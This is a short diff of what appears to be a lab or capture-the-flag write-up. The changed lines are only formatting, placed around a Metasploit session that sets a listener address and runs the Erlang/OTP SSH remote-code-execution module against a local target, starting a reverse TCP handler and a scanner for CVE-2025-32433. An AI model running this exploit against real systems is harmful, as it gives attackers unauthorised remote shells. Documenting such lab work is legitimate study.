@@ -184,7 +184,10 @@ Module options (exploit/linux/ssh/ssh_erlangotp_rce):
 ---
 
 [msf](Jobs:0 Agents:0) exploit(linux/ssh/ssh_erlangotp_rce) >> set LHOST 10.10.14.39
+---
+
 [msf](Jobs:0 Agents:0) exploit(linux/ssh/ssh_erlangotp_rce) >> run
+
 [*] Started reverse TCP handler on 10.10.14.39:4444
 [*] 127.0.0.1:2222 - Running automatic check ("set AutoCheck false" to disable)
 [*] 127.0.0.1:2222 - Starting scanner for CVE-2025-32433
